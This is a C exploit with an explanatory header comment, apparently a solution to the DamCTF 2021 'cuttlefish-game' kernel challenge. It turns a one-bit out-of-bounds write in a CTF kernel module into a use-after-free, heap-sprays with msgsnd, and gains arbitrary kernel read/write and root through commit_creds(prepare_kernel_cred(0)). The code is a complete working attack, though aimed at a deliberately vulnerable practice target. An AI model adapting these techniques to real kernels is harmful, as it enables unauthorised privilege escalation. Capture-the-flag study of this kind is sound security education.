// gcc -static expliot.c -o exploit

/* 
 * Exploit for DamCTF 2021 cuttlefish-game challenge
 * Ryan McVeety
 * 
 * Babies first kernel challenge! This was a lot of fun, even if I did spend almost 16 hrs on it.
 * 
 * The provided kernel module exposes an ioctl interface to manage different "games". The first time
 * a game with a given name is requested, a new game_t (and associated state_t) is kmalloced, and a 
 * new serial linked to it is created and returned. Subsequent requests create new serials, but they
 * are all pointing to the original game_t struct.
 * 
 * The number of serials pointing to a game is tracked in the refcount field of the game_t struct.
 * If the count ever goes to 0 (all serials have been released), the underlying game_t and state_t
 * structs are kfreed.
 * 
 * game_t and state_t are both 192 bytes, meaning they are serviced by the same slab in kmalloc, and
 * they will be densely packed (no empty space between objects).
 * 
 * The vulnerability in the module is in the tracker_mark function. It is meant to respond to
 * MARK_DEAD and MARK_ALIVE requests by clearing and setting bits in the contestants array of a 
 * game's state_t struct. Due to an incorrect check, it allows a one bit out of bounds write.
 * 
 * We use this to alter the refcount of a following game_t struct, clearing the least
 * significant bit and making the game think it has one less serial referencing it than it actually
 * does. Note that we can't set the refcount directly to 0, there are checks in the refcount
 * operations for that. Instead, we take three references and overwrite the count to 2. That allows
 * us to release 2 serials and kfree the memory, while keeping the third serial alive pointing to
 * the freed game_t.
 * 
 * Now to abuse our use after free. The only good read/write options we have are through the state 
 * pointer on game_t, so we need that to be pointing at something useful. If we can fill the hole
 * left by the state_t struct with a game_t struct, we'll be able to read and write the state
 * pointer of *that* game. That leaks the kernel heap, and by changing that pointer we can read and
 * write arbitrary memory.
 * 
 * Unfortunately, simply allocating another game_t won't work, as the free game_t allocation will
 * end up being reused for the new game's struct, and even if it was reused with a state_t struct
 * the pointer we need would be clobbered. Instead, we'll use msgsnd() to fill the free game_t hole
 * with a 136 byte msg_msg struct. The state pointer is 160 bytes in, so it remains unclobbered. 
 * With the hole filled, allocating a new game will reuse the old state_t chunk for a game_t struct,
 * giving us an arbitrary read/write as described above.
 * 
 * We have a leak of the kernel heap, but we still need an address into the kernel itself. To do
 * that we use our arbitrary read to follow the ops pointer on the new game_t that we are puppeting.
 * ops is a pointer to dummy_gops, an instance of gameops_t struct common to all games. It contains
 * 6 function pointers, and is initialized at module load to contain a reference to the kernel
 * function clock_t_to_jiffies. We use the arbitrary read to leak this value, and can then calculate
 * other function addresses using offsets.
 * 
 * To gain root, we'll go with the normal commit_creds(prepare_kernel_cred(0)) route. After
 * calculating their addresses, we'll write them into the dummy_ops struct so we can call them
 * through the normal module functions. One caveat is that we only get 32bits of the return value
 * for each function, since it's being passed as the return code of ioctl. This means that when
 * we trigger the call to prepare_kernel_cred(0), we only get the lower 32bits of the pointer to the
 * created credentials struct. It's allocated on the heap though, so we use our existing heap leak 
 * to fill in the upper 32 bits.
 * 
 * Once our process's privileges have been elevated, we print out the flag and exit.
 * 
 * dam{a_B1t_0f_4_cl1ch3d_r3f4reNc3}
 * 
 * References:
 * https://pwn.college/modules/kernel
 * https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1
 * https://ruffell.nz/programming/writeups/2019/02/15/looking-at-kmalloc-and-the-slub-memory-allocator.html
 * https://duasynt.com/blog/linux-kernel-heap-spray
 */

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define GET_GAME 0x1337
#define SET_NOTES 0x1338
#define RELEASE_GAME 0x1339
#define EXE_GAME 0x133a
#define MARK_ALIVE 0x133b
#define MARK_DEAD 0x133c
#define GET_STATUS 0x133d

#define PREPARE_KERNEL_CRED_OFFSET 0x50ad0
#define COMMIT_CREDS_OFFSET 0x50d70

// contestanttrack.ko ioctl request struct
typedef struct
{
    char buf[135];
    uint32_t serial;
    long gamenum;
    long args;
    long contestant;
} request_t;

// msg struct, used with msgsnd() to fill holes in the heap
#define MSG_BUF_SIZE 136-48
typedef struct {
    long mtype;
    char mtext[MSG_BUF_SIZE];
} msg_t;

// This struct will help us parse out some pointers from a leak we get
typedef struct __attribute__((packed))
{
    char padding1[25];
    long state_ptr;
    long ops_ptr;
} leak_t;

// Copy the contents of the given game's contestants buffer, bit by bit, into out
void get_all_status(int fd, uint32_t serial, char* out) {
    memset(out, 0, 57);
    
    request_t req;
    req.serial = serial;
    
    for (size_t i = 0; i < 456; i++)
    {
        req.contestant = i;
        long status = ioctl(fd, GET_STATUS, &req);
        if (status) {
            out[i >> 3] |= 1 << (i & 7);
        } else {
            out[i >> 3] &= ~(1 << (i & 7));
        }
    }
}

// Write data in the contents of the give game's contestants buffer, bit by bit
void write_data(int fd, uint32_t serial, char* data, size_t len) {
    assert(len <= 57);

    request_t req;
    req.serial = serial;

    for (size_t i = 0; i < (len << 3); i++)
    {
        req.contestant = i;
        long status = (data[i>>3] & (1 << (i & 7))) >> (i&7);

        if (status) {
            ioctl(fd, MARK_ALIVE, &req);
        } else {
            ioctl(fd, MARK_DEAD, &req);
        }
    }
    
}

// Write 64 bits at the correct offset to later be used by read64 and write64
// Also correct given address to account for leading members of state_t struct we don't have access
// to
void write_target_addr(int fd, uint32_t serial, uint64_t addr) {
    uint64_t offset = 25 << 3; // offset of state pointer (in bits) in our controlled region

    request_t req;
    req.serial = serial;
    
    // The contestants array (what we're eventually reading/writing out of) starts 135 bytes into 
    // the struct. offset the target address to account for this
    addr -= 135;

    char* data = (char*)(&addr);

    for (size_t i = 0; i < 64; i++)
    {
        req.contestant = i + offset;
        long status = (data[i>>3] & (1 << (i & 7))) >> (i&7);

        if (status) {
            ioctl(fd, MARK_ALIVE, &req);
        } else {
            ioctl(fd, MARK_DEAD, &req);
        }
    }
    
}

// Arbitrary kernerl read. Use the "controller" game to overwrite the state pointer in the "puppet" 
// game to point to our target address (technically a little behind it), and read data out of
// "puppet"s contestants array
uint64_t read64(int fd, uint32_t controller_serial, uint32_t puppet_serial, uint64_t addr) {
    write_target_addr(fd, controller_serial, addr);
    
    char buf[57];
    get_all_status(fd, puppet_serial, buf);

    uint64_t data = (uint64_t)(*(uint64_t*)&buf[0]);

    return data;
}

// Arbitrary kernerl write. Use the "controller" game to overwrite the state pointer in the "puppet" 
// game to point to our target address (technically a little behind it), and write data into
// "puppet"s contestants array
void write64(int fd, uint32_t controller_serial, uint32_t puppet_serial, uint64_t addr, uint64_t data) {
    write_target_addr(fd, controller_serial, addr);

    write_data(fd, puppet_serial, (char*)(&data), 8);
}

int main() {
    printf("getuid: %x\n", getuid());
    printf("getuid: %x\n", geteuid());

    int fd = open("/proc/tracker", 0);
    assert(fd > 0);

    // We'll use the msgsnd to fill a hole in the heap later, set that up now
    msg_t msg;
    memset(msg.mtext, 0x44, MSG_BUF_SIZE-1);
    msg.mtext[MSG_BUF_SIZE - 1] = 0;
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    

    // Initial setup of games (1 reference to A, 3 to B)
    request_t req;
    memset(&req, 0, sizeof(request_t));
    strcpy(req.buf, "AAAAAAAA");

    uint32_t serialA1 = ioctl(fd, GET_GAME, &req);
    printf("SerialA1: %u\n", serialA1);

    strcpy(req.buf, "BBBBBBBB");
    uint32_t serialB1 = ioctl(fd, GET_GAME, &req);
    uint32_t serialB2 = ioctl(fd, GET_GAME, &req);
    uint32_t serialB3 = ioctl(fd, GET_GAME, &req);
    printf("SerialB1: %u\n", serialB1);
    printf("SerialB2: %u\n", serialB2);
    printf("SerialB3: %u\n", serialB3);

    // Use 1 bit overflow to clear out lsb of game B's refcount (goes from 3 to 2)
    req.serial = serialA1;
    req.contestant = 456;
    ioctl(fd, MARK_DEAD, &req);

    // Release two of our game serials, decreasing the refcount to 0 and kfreeing the underlying
    // memory, while we still have serialB1 pointing to it
    req.serial = serialB2;
    ioctl(fd, RELEASE_GAME, &req);
    req.serial = serialB3;
    ioctl(fd, RELEASE_GAME, &req);

    // the allocated msg struct fills the hole of the game B game_t struct, but is sized so it
    // doesn't overwrite the state pointer, so we can continute to use our UAF. This works because
    // the SLUB allocator groups allocations of similar sizes together

    // We need to fill this hole because otherwise game C would be allocated directly over game B.
    // Filling the hole game B's game_t struct left allows game C's game_t struct to be allocated
    // elsewhere
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);

    // C's game_t struct is placed in the hole that game B's state_t struct was. This will allow us
    // to read and write the interesting pointers in C's game_t from B' state_t (using MARK_ALIVE, 
    // MARK_DEAD, and GET_STATUS to write & read individual bits)
    strcpy(req.buf, "CCCCCCCC");
    uint32_t serialC1 = ioctl(fd, GET_GAME, &req);
    printf("SerialC1: %u\n", serialC1);

    // Read each bit of B's contestant's statuses. Because of the use after free, this is currently
    // pointing at some juicy pointers in C's game_t struct
    leak_t leak;
    get_all_status(fd, serialB1, (char *)(&leak));
    printf("state: %#lx\n", leak.state_ptr);
    printf("ops: %#lx\n", leak.ops_ptr);

    // Leak kernel address from pointer to clock_t_to_jiffies in dummy_gops
    long leak_addr = read64(fd, serialB1, serialC1, leak.ops_ptr + 8);
    printf("leak addr: %#lx\n", leak_addr);

    // Bail out if things aren't looking like we expect. Probably means heap layout wasn't as
    // expected, and the refcount overwrite failed
    if (leak_addr == -1) {
        printf("FAILED\n");
        return 0;
    }

    long prepare_kernel_cred_addr = leak_addr - PREPARE_KERNEL_CRED_OFFSET;
    long commit_creds_addr = leak_addr - COMMIT_CREDS_OFFSET;
    printf("prepare_kernel_cred: %#lx\n", prepare_kernel_cred_addr);
    printf("commit_creds: %#lx\n", commit_creds_addr);

    // Overwrite dummy_gops function pointers with functions we want to call
    write64(fd, serialB1, serialC1, leak.ops_ptr, prepare_kernel_cred_addr);
    write64(fd, serialB1, serialC1, leak.ops_ptr + 8, commit_creds_addr);

    // Execute game 1, the fuction pointer for which is currently pointing to prepare_kernel_cred
    req.serial = serialC1;
    req.gamenum = 1; //prepare_kernel_cred
    req.args = 0;
    int prepare_creds_result = ioctl(fd, EXE_GAME, &req);

    // ioctl only returns 32 bits, so we only get the lower half of the address of the created
    // credentials struct. Since it's allocated on the heap, we can use the top half of another
    // leaked heap pointer to fill it in.
    printf("prepare_creds_result: %#lx\n", prepare_creds_result);
    long actual_address = (leak.state_ptr & 0xFFFFFFFF00000000) | (prepare_creds_result & 0x00000000FFFFFFFF);
    printf("actual_address: %#lx\n", actual_address);

    // Execute commit_creds with our created credentials struct. Gives this process root
    req.gamenum = 2; // commit_creds
    req.args = actual_address;
    int commit_creds_result = ioctl(fd, EXE_GAME, &req);

    printf("commit_creds_result: %#lx\n", commit_creds_result);

    // Prove we're root, and print the flag!

    printf("getuid: %x\n", getuid());
    printf("getuid: %x\n", geteuid());

    system("cat /flag");

    close(fd);
}